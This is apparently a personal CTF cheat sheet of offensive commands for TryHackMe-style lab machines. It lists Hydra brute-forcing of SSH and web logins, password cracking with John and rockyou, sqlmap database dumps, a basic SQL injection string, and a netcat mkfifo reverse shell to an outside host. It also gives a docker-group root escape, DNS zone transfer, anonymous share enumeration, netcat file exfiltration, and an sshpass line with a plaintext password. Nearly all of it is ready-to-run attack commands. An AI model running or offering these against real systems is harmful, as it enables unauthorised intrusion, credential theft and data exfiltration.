### Nmap
`nmap -sC -sV 10.10.105.34`
`nmap --script vuln ip -vv`
### No ICMP
`nmap -Pn 10.10.105.34`

### Generates hash for /etc/passwd(user should already exist)
`openssl passwd -1`

### for /etc/shadow
`mkpasswd -m sha-512 password`
`snap run john-the-ripper --wordlist=~/rockyou.txt hash`

### John
`/snap/bin/john-the-ripper.gpg2john`
`./zip2john 8702.zip > hash`  
`ssh2john.py id_rsa`

### Awk
`awk 'length($0)==10' rockyou.txt`

### Stegography 
`steghide extract -sf`
`stegcracker cute-alien.jpg ~/rockyou.txt`

### Hydra
`hydra -l <username> -P <path to wordlist> <IP> ssh`
`hydra -l molly -P rockyou.txt 10.10.57.111 http-post-form "/login:username=molly&password=^PASS^:incorrect" -V`

### Reminder
`nikto`

### Wfuzz
`wfuzz -c -z file,dates.list -d "date=FUZZ" -u http://10.10.181.57/site-log.php --hc 404`

`sshpass -p !4u2tryhack ssh username@host.example.com`

### Words on web page
`cewl`  

### Sqlmap
`sqlmap -r req.txt -p blood_group -D blood --dump-all`
`sqlmap -r burp.txt --tamper=space2comment --dump-all --dbms sqlite`

### Stable rev shell
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.3.125 4444 >/tmp/f`

### Stabilize shell
`python3 -c "import pty;pty.spawn('/bin/bash')"`
`export TERM=xterm`
`//CTRL + Z to background`
`stty raw -echo;fg` 

### If docker in groups (may help may not)
`docker run -v /:/mnt --rm -it alpine chroot /mnt sh`

### Disclose subdomains(@dns-server)
`dig axfr hipflasks.thm @10.10.113.230`

### Mount samba share under username
`sudo mount -t cifs -o username=ubuntu //10.10.7.87/sambashare /media/samba`

### Simple SQLi
`' OR '1'='1' --`

### SQL list
https://github.com/payloadbox/sql-injection-payload-list.git

### NFS
`showmount --exports 10.10.41.139`
`mount 10.10.41.139:/opt/conf /media/nfs`

### Rsync
`rsync --list-only rsync://rsync-connect@10.10.41.139`

### GPG
`gpg --import key.asc`
`gpg --decrypt file.pgp`

### Samba
`smbclient -NL 10.10.215.0`
`smbclient -N //10.10.215.0/VulnNet-Enterprise-Anonymous`

### Netcat recv and send
`nc -q 1 -l -p 7777 > runme`
`nc -q 1 10.9.3.125 7777 < /home/catlover/runme`
